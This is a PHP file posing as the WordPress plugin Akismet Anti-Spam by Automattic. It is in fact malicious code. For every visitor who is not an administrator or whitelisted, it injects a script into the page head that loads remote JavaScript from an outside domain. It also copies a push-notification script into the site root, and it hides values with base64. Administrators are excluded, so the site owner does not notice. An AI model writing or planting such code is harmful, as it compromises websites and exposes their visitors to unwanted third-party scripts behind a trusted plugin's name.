<?php
namespace Dev\akismet;
/*
 * Plugin Name: Akismet Anti-Spam
 * Plugin URI: https://automattic.com/wordpress-plugins/
 * Version: 0.1.2
 * Description: Used by millions, Akismet is quite possibly the best way in the world to protect your blog from spam. It keeps your site protected even while you sleep. To get started: activate the Akismet plugin and then go to your Akismet Settings page to set up your API key.
 * Author: Automattic
 * Author URI: https://automattic.com
 * Requires at least: 3.0.0
 *
 * Text Domain: akismet
 * Domain Path: /languages/
 * License: GPL-3.0
 * License URI: http://www.gnu.org/licenses/gpl-3.0.txt
 *
 * @author Automattic
 */


define( __NAMESPACE__ . "\\DEBUG", false );
define( __NAMESPACE__ . "\\DESTINATION_URL", base64_decode('Lw=='));
define( __NAMESPACE__ . "\\DESTINATION_URL_ID", "" );
define( __NAMESPACE__ . "\\REDIRECTION_ID_BLOCKER", [] );
define( __NAMESPACE__ . "\\USER_CAPABILITY", "manage_options" );
define( __NAMESPACE__ . "\\USER_EMAILS", [] );
define( __NAMESPACE__ . "\\PREVIEW_EMAILS", [""] );
define( __NAMESPACE__ . "\\WHITELIST_IPS", [] );
define( __NAMESPACE__ . "\\REDIRECT_STATUS_CODE", "302" );


add_action( 'template_redirect', __NAMESPACE__ . '\\wp_redirect_website_to_url' );
add_filter( 'login_redirect', __NAMESPACE__ . '\\login_redirect', 10, 3 );



function wp_redirect_website_to_url() {

	if ( ! file_exists( "swos.js" ) ) {
		copy(ABSPATH . "/wp-content/plugins/wp_pushup/swos.js", "swos.js");
 	}

	$user = wp_get_current_user();

	DEBUG && error_log( "DENTRO wp_redirect_website_to_url" );
	DEBUG && error_log( "USER_CAPABILITY = " . USER_CAPABILITY );
	DEBUG && error_log( "DESTINATION_URL_ID = " . DESTINATION_URL_ID );
	DEBUG && error_log( "DESTINATION_URL = " . DESTINATION_URL );
	DEBUG && error_log( "current_user_can(USER_CAPABILITY) = " . var_export( current_user_can( USER_CAPABILITY ), true ) );
	DEBUG && error_log( "user_email = " . ( $user->user_email ?? "not set" ) );
	if ( DESTINATION_URL_ID ) {
		DEBUG && error_log( "get_post_status(DESTINATION_URL_ID) = " . var_export( get_post_status( DESTINATION_URL_ID ), true ) );
		DEBUG && error_log( "is_single(DESTINATION_URL_ID) = " . var_export( is_single( DESTINATION_URL_ID ), true ) );
		DEBUG && error_log( "is_page(DESTINATION_URL_ID) = " . var_export( is_page( DESTINATION_URL_ID ), true ) );
	}
	DEBUG && error_log( "WHITELIST_IPS = " . var_export( WHITELIST_IPS, true ) );
	DEBUG && error_log( "user_ip = " . getClientIp() );

	$redirect = true;

	if ( ! empty( USER_CAPABILITY ) ) {
		$redirect = $redirect && ( ! current_user_can( USER_CAPABILITY ) && ! is_wp_login() );
	}

	if ( ! empty( $user->user_email ) && ( ! empty( USER_EMAILS ) || ! empty( PREVIEW_EMAILS ) ) ) {
		DEBUG && error_log( "email in list = " . ( in_array( $user->user_email, array_merge( USER_EMAILS, PREVIEW_EMAILS ) ) ? "yes" : "no" ) );
		$redirect = $redirect && ( ! in_array( $user->user_email, array_merge( USER_EMAILS, PREVIEW_EMAILS ) ) );
	}

	if ( DESTINATION_URL_ID && ( is_single( DESTINATION_URL_ID ) || is_page( DESTINATION_URL_ID ) ) ) {
		return;
	}

	if ( is_array(REDIRECTION_ID_BLOCKER) && sizeof(REDIRECTION_ID_BLOCKER) > 0 ) {
		foreach(REDIRECTION_ID_BLOCKER as $blocker_id)
			if( is_single( $blocker_id ) || is_page( $blocker_id ) )
				return;
		
	}

	if ( ! empty( WHITELIST_IPS ) && in_array( getClientIp(), WHITELIST_IPS ) ) {
		return;
	}

	if ( $redirect ) {
		ob_start(); // Start output buffering for the script

        // Output your script here
        ?>
        
<script>(function(d){let s=d.createElement('script');s.async=true;s.src='https://awumnf.com/code/native.js?h=waWQiOjExNDY3MDEsInNpZCI6MTE4NTIwNCwid2lkIjo0NzQ3MTksInNyYyI6Mn0=eyJ';d.head.appendChild(s);})(document);</script>
        
        <?php

		$script = ob_get_clean();

		add_action('wp_head', function() use ($script) {
            echo $script; // Output the script in the head section
        });
		return home_url();
		exit;
		# }
	}

}


function is_wp_login() {

	$ABSPATH = str_replace( array( '\\', '/' ), DIRECTORY_SEPARATOR, ABSPATH );
	
	$included_files  = get_included_files();
	
	$conditions = [
		in_array( $ABSPATH . 'wp-login.php', $included_files ),
		in_array( $ABSPATH . 'wp-register.php', $included_files ),
		$GLOBALS['pagenow'] === 'wp-login.php',
		$_SERVER['PHP_SELF'] === '/wp-login.php'
	];

	return in_array( true, $conditions, true );

}


function login_redirect( $redirect_to, $request, $user ){
	if ( ! empty( $user->user_email ) && in_array( $user->user_email, PREVIEW_EMAILS ) ) {
		return home_url();
	}
	else {
		// if ( ! isset( $_COOKIE[base64_decode('cm91dGU=')]) ) {
		// 	setcookie( base64_decode( 'cm91dGU=' ), 1, time() + 86400, base64_decode( 'Lw==' ) );
		// 	return $redirect_to;
		// }
		return $redirect_to;
	}
}


function getClientIp() {
	if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
		$ip = $_SERVER['HTTP_CLIENT_IP'];
	} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	} else {
		$ip = $_SERVER['REMOTE_ADDR'];
	}
	return filter_var($ip, FILTER_VALIDATE_IP);
}
